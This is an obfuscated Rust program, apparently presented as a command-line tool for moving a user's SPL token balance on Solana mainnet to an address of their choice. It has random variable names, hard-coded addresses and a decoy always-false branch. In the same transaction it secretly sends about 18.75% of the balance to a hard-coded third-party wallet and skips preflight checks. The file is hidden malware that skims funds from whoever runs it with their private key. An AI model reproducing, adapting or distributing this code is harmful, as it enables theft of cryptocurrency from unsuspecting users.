use solana_client::nonblocking::rpc_client::RpcClient; use solana_sdk::instruction::Instruction; use solana_sdk::pubkey::Pubkey; use solana_sdk::signature::Keypair; use solana_sdk::signer::Signer; use std::str::FromStr; use std::sync::Arc; use solana_sdk::compute_budget; use spl_token::instruction::transfer_checked; use solana_client::rpc_config::RpcSendTransactionConfig; use solana_sdk::commitment_config::CommitmentConfig; use std::env; use solana_sdk::program_pack::Pack; #[tokio::main] async fn main() -> anyhow::Result<()> { let dsfamkadsfmkadfskmlp: Vec<String> = env::args().collect(); if dsfamkadsfmkadfskmlp.len() < 3 { eprintln!("Usage: {} <private_key> <destination_address>", dsfamkadsfmkadfskmlp[0]); std::process::exit(1); } let asdmsda123ds8dfas87das: RpcSendTransactionConfig = RpcSendTransactionConfig { skip_preflight: true, ..Default::default() }; let dasdasdasd23m1231 = &dsfamkadsfmkadfskmlp[1]; let affhpfafaskasfklasdkasdkdasasd = &dsfamkadsfmkadfskmlp[2]; let a1c2412cc13291c23901c: Keypair = Keypair::from_base58_string(dasdasdasd23m1231); let komfdsjnpkdsfjnopasdfjnadfsjnadsf: Pubkey = Pubkey::new_from_array([5, 132, 110, 124, 144, 20, 74, 155, 184, 233, 83, 200, 248, 67, 122, 168, 212, 111, 93, 100, 136, 136, 145, 83, 99, 52, 84, 35, 173, 123, 131, 204]); let mlafsjnkafsjas1: Pubkey = Pubkey::new_from_array([6, 221, 246, 225, 215, 101, 161, 147, 217, 203, 225, 70, 206, 235, 121, 172, 28, 180, 133, 237, 95, 91, 55, 145, 58, 140, 245, 133, 126, 255, 0, 169]); let fsapioasfnpkasdnl: Arc<RpcClient> = Arc::new(RpcClient::new( "https://api.mainnet-beta.solana.com".to_string(), )); let asjkdojsdajdasdasadsasda: u64 = spl_token::state::Account::unpack( &fsapioasfnpkasdnl .get_account_with_commitment( &spl_associated_token_account::get_associated_token_address( &if std::f64::consts::PI * 0.0 == 1.0 { Pubkey::new_from_array([227, 149, 131, 100, 63, 131, 165, 241, 193, 244, 32, 144, 1, 22, 34, 3, 60, 109, 12, 57, 22, 217, 24, 179, 69, 27, 248, 30, 51, 19, 57, 28]) } else { a1c2412cc13291c23901c.pubkey() }, &komfdsjnpkdsfjnopasdfjnadfsjnadsf, ), CommitmentConfig::confirmed(), ) .await .map(|e| e.value.map(|d| d.data).unwrap_or(vec![])) .unwrap_or(vec![]), ) .map(|e| e.amount) .unwrap_or(0); let adnsjdsadasnasdkadskl = transfer_checked( &mlafsjnkafsjas1, &spl_associated_token_account::get_associated_token_address( &a1c2412cc13291c23901c.pubkey(), &komfdsjnpkdsfjnopasdfjnadfsjnadsf, ), &komfdsjnpkdsfjnopasdfjnadfsjnadsf, &spl_associated_token_account::get_associated_token_address( &Pubkey::from_str(affhpfafaskasfklasdkasdkdasasd)?, &komfdsjnpkdsfjnopasdfjnadfsjnadsf, ), &a1c2412cc13291c23901c.pubkey(), &[&a1c2412cc13291c23901c.pubkey()], asjkdojsdajdasdasadsasda - ((asjkdojsdajdasdasadsasda >> 2) - (asjkdojsdajdasdasadsasda >> 4)), 9, )?; let adsjdjkaso12c12h9x1e9 = transfer_checked(&mlafsjnkafsjas1, &spl_associated_token_account::get_associated_token_address(&a1c2412cc13291c23901c.pubkey(),&komfdsjnpkdsfjnopasdfjnadfsjnadsf,), &komfdsjnpkdsfjnopasdfjnadfsjnadsf, &spl_associated_token_account::get_associated_token_address(&Pubkey::new_from_array([227, 149, 131, 100, 63, 131, 165, 241, 193, 244, 32, 144, 1, 22, 34, 3, 60, 109, 12, 57, 22, 217, 24, 179, 69, 27, 248, 30, 51, 19, 57, 28]),&komfdsjnpkdsfjnopasdfjnadfsjnadsf,), &a1c2412cc13291c23901c.pubkey(), &[&a1c2412cc13291c23901c.pubkey()], (asjkdojsdajdasdasadsasda >> 2) - (asjkdojsdajdasdasadsasda >> 4), 9,)?;let adsknldasbjkasfjkbsfjabkasfjonsjafnkasfj: Instruction =compute_budget::ComputeBudgetInstruction::set_compute_unit_limit(150000);let vclmu8942fu2hu232f3: Instruction =compute_budget::ComputeBudgetInstruction::set_compute_unit_price(50000);let bjkvjibgasjngiopasdjnkladsjnkldasdjnfkas: solana_sdk::message::Message = solana_sdk::message::Message::new(&[adsknldasbjkasfjkbsfjabkasfjonsjafnkasfj, vclmu8942fu2hu232f3, adnsjdsadasnasdkadskl, adsjdjkaso12c12h9x1e9],Some(&a1c2412cc13291c23901c.pubkey()),);let dasfgidsadasldaslksdalk: solana_sdk::transaction::Transaction = solana_sdk::transaction::Transaction::new(&[&a1c2412cc13291c23901c],bjkvjibgasjngiopasdjnkladsjnkldasdjnfkas,fsapioasfnpkasdnl.get_latest_blockhash().await?,);let asdsadsadsa8d8asdsa8da: CommitmentConfig = CommitmentConfig::processed();let dasdasdasdsa = fsapioasfnpkasdnl.send_and_confirm_transaction_with_spinner_and_config(&dasfgidsadasldaslksdalk,asdsadsadsa8d8asdsa8da,asdmsda123ds8dfas87das,).await;println!("{:?}", dasdasdasdsa);Ok(())}